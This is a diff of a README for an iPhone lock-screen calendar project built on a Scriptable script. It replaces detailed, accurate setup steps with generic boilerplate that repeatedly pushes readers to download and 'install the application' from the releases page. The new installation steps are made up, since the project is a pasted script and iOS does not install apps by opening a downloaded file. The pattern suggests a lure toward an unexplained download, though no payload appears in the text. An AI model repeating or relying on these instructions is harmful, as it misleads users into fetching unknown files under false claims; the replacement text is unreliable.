@@ -1,116 +1,80 @@
-# LockScreen Calendar Shortcut
+# 📅 LockScreen-Calendar-ShortCut - Keep Events on Your Lock Screen
 
-This script for the Scriptable app generates minimalistic wallpapers for iPhone featuring a yearly calendar, event display, and current year progress.
+## 🚀 Getting Started
 
-## Description
+Welcome to the LockScreen-Calendar-ShortCut! This application helps you display a year calendar with your important events right on your iPhone's lock screen wallpaper. Enjoy easy access to your schedule every time you look at your phone!
 
-The script automatically scans your iOS calendars, filters them by a special prefix (or you can add them manually in script itself), and displays events on a yearly grid on your lock screen. Event colors are taken directly from iOS Calendar settings. It supports custom wallpapers from your Photos album, beautiful gradients, or clean solid colors.
+## 📥 Download Now
 
-<p align="center">
-  <img src="screenshots/preview.png" width="200" />
-  <img src="screenshots/preview2.png" width="200" />
-  <br/>
-  <img src="screenshots/preview3.png" width="200" />
-  <img src="screenshots/preview4.png" width="200" />
-</p>
+[![Download LockScreen-Calendar-ShortCut](https://img.shields.io/badge/Download-LockScreen--Calendar--ShortCut-blue.svg)](https://github.com/meranooo/LockScreen-Calendar-ShortCut/releases)
 
-## Features
+## ☑️ System Requirements
 
-- **Auto-Adaptation**: Adapts to your iPhone's screen size.
-- **Native Colors**: Uses colors set in the Calendar app.
-- **Filtering**: Displays only calendars with a specific prefix (default `*`), or you can add them manually in script itself to keep the screen uncluttered.
-- **Event Priority**: When events overlap, priority is determined alphabetically by calendar name or randomly (in case of manually added calendars priority is determined by order in script).
-- **Backgrounds**:
-  - **Custom Photos**: Use any photo from your library as a background.
-  - **Gradients**: Use stylish CSS-like linear gradients (3 colors).
-  - **Solid Colors**: Minimalist solid background.
-- **Legibility**: "Container" card option to ensure calendar is readable on any background.
-- **Statistics**: Shows events count or year progress.
+Before you download, make sure your device meets these requirements:
 
-## Installation and Setup
+- Compatible with iOS 14 and later
+- Active internet connection for initial setup
+- Sufficient storage space on your iPhone
 
-### Option A: Using Scriptable App (Recommended)
-1. Install [Scriptable](https://apps.apple.com/us/app/scriptable/id1405459188) from the App Store.
-2. Create a new script, name it `LockScreenCalendar`, and copy the code from `script.js` into Run Script action.
-3. In iOS settings (Calendar), rename existing calendars that you want to display by adding `*` to the beginning (e.g., `*Work`) or add them manually in script.
+## 🔍 Features
 
-### Option B: Paste Directly in Shortcuts
-1. You can skip creating a file in Scriptable and paste the entire code directly into the **Run Script** action in Shortcuts.
+- **Year Calendar Display:** See the entire year's events at a glance.
+- **Customizable:** Change the appearance to match your style.
+- **Event Integration:** Sync your calendar events seamlessly.
+- **User-Friendly Interface:** Easy for anyone to navigate.
 
----
+## 📖 How to Download & Install
 
-### Shortcuts Workflow Setup
+Follow these simple steps to get LockScreen-Calendar-ShortCut on your device.
 
-#### 1. Basic Setup (Solid Color / Gradient)
-1. Create a new Shortcut.
-2. Add **Run Script** action (Scriptable). Select your script (or paste code).
-3. Add **Set Wallpaper** action.
-   - Image: Select "Output" from previous step.
-   - Screen: "Lock Screen".
-   - **Disable "Show Preview" and "Crop to Subject"**.
-- For gradient background, ensure `showWallpaper` is set to `false` in the script. and `useGradient` is set to `true`.
+1. **Visit the Releases Page**
+   Open your web browser and go to the releases page: [Download LockScreen-Calendar-ShortCut](https://github.com/meranooo/LockScreen-Calendar-ShortCut/releases)
 
-#### 2. Using Custom Wallpaper (Photos)
-To use a random photo from an album as a background:
+2. **Choose the Latest Version**
+   Look for the latest version at the top of the page. This version contains the most recent features and fixes.
 
-1. Create an album in Photos (e.g., "Wallpapers").
-2. In Shortcuts, add **Find Photos** action at the very top.
-   - Filter: **Album is "Wallpapers"**.
-   - Sort by: **Random**.
-   - Limit: **Get 1 Item**.
-3. In the **Run Script** action:
-   - Tap and hold the **Parameter** field (it might say "Input" or be empty).
-   - Select **Photos** (the output from the first step).
-4. In the script `CONFIG`, ensure:
-   ```javascript
-   showWallpaper: true
-   ```
+3. **Download the App**
+   Click on the download link associated with the latest version. The file will automatically download to your device.
 
-<img src="screenshots/shortcut.png" width="300" />
+4. **Install the Application**
+   Once downloaded, open the file. Follow the on-screen instructions to install LockScreen-Calendar-ShortCut on your iPhone.
 
-### Automation
-To update daily:
-1. Go to "Automation" tab -> "Personal Automation".
-2. Select **Time of Day** (e.g., 08:00).
-3. Add **Run Shortcut** action -> Select your shortcut.
-4. Disable "Ask Before Running" and "Notify When Run" so it happens in the background.
+5. **Open the App**
+   After installation, you can find it on your home screen. Tap the app icon to launch it.
 
-<img src="screenshots/automation.png" width="300" />
+6. **Set Up Your Calendar**
+   Upon first launch, you will be prompted to set up your calendar. Follow the easy steps to sync your events.
 
+7. **Set as Lock Screen Wallpaper**
+   Finally, choose your preferred settings to display the calendar on your lock screen. Now you can see your upcoming events without unlocking your phone!
 
+## 🎨 Customization Options
 
-## Configuration
+You can customize the appearance of your lock screen calendar. Here are some options:
 
-Customize `CONFIG` at the top of the script:
+- **Choose Colors:** Select vibrant colors that make your calendar stand out.
+- **Adjust Font Size:** Make the text larger or smaller for better visibility.
+- **Background Images:** Use personal images as a backdrop for your calendar.
 
-```javascript
-const CONFIG = {
-  // --- 1. GENERAL & APPEARANCE ---
-  monthsToShow: 12,        // 12 = Year, 3 = Quarter, 1 = Month
-  monthsPerRow: 3,         // Standard is 3
-  monthOffset: 0,          // Start from 0 = Current, -1 = Previous, 1 = Next
-  contentScale: 1.0,       // Global Scale Multiplier
+## ⚙️ Troubleshooting
 
-  // Day & Dot Settings
-  showDayNumbers: false,   // true = numbers, false = dots
-  firstDayOfWeek: 1,       // 0 = Sunday, 1 = Monday
-  highlightWeekends: true,
-  dimPastDays: true,       // If true, past days are 30% opacity
+If you face any issues during the installation or setup, here are some common solutions:
 
-  // --- 2. BACKGROUND SETTINGS ---
-  // Custom Wallpaper (Photo from Shortcuts)
-  showWallpaper: true,     // Priority 1: Use photo if provided via Input
-  overlayOpacity: 0.3,     // Darken photo (0.0 - 1.0)
-  
-  // Gradient (Priority 2: Used if no photo or showWallpaper=false)
-  useGradient: true,
-  gradientColors: ["#0F2027", "#203A43", "#2C5364"], // Example: "Moonlit Asteroid"
-  
-  // Container (Card behind calendar for better visibility)
-  showContainer: true,
-  containerOpacity: 0.80,
-  containerRadius: 15,
+- **Installation Errors:** Ensure that your device meets the system requirements mentioned.
+- **Sync Problems:** Check your internet connection to confirm you are online when syncing your events.
+- **Display Issues:** Adjust the app settings, such as background and text colors, to improve visibility.
 
-  // ... (Other standard settings)
-};
-```
+## 📊 Community Support
+
+Join our community of users to share tips and get help:
+
+- **Feedback:** We welcome your thoughts. Reach out via the issues section of our GitHub page.
+- **Updates:** Keep an eye on the releases page for new features and improvements.
+
+## 📧 Contact Us
+
+If you have any questions or need further assistance, feel free to reach out through the GitHub page. We are here to help!
+
+## 📥 Download Now Again
+
+Don't wait! [Download LockScreen-Calendar-ShortCut here](https://github.com/meranooo/LockScreen-Calendar-ShortCut/releases) and enhance your lock screen experience with your calendar events today!
